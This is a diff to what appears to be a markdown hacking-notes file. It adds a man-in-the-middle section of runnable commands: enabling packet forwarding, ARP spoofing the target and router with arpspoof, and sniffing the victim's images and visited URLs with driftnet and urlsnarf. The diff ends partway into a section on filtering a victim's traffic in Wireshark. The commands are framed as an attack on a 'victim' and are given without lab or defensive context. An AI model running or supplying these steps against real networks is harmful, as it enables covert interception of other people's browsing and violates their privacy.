@@ -45,4 +45,20 @@
     SF:2");
   ```
 
+3. Man in the Middle attack
+  - Enable packet forwarding `sysctl -w net.ipv4.ip_forward=1` and `sysctl -w net.ipv6.conf.all.forwarding=1`
+  - Intercept packages from victim: `arpspoof -i [Network Interface Name] -t [Target IP] [Router IP]`
+    to check [Network Interface Name] and [Router IP] run `ip route show`, the final command should be similar to `arpspoof -i eth0 -t 192.168.0.17 192.168.0.1`
+  - Intercept package from router: `arpspoof -i [Network Interface Name] -t [Router IP] [Target IP]`
+  - Sniff images from victim navigation: `driftnet -i [Network Interface Name]`
+  - Sniff URLs information from victim navifation: `urlsnarf -i [Network
+    Interface Name]`
+  - Finally disable packet forwarding: `sysctl -w net.ipv4.ip_forward=0` and `sysctl -w net.ipv6.conf.all.forwarding=0`
+ 
 
+4. Wireshark
+  - Let's say we want to know what our victim is doing on specific page (and we
+    know IP of that server). We can filter our results by _source_ and
+destination_:
+
+    ![](images/wireshar_example.png)
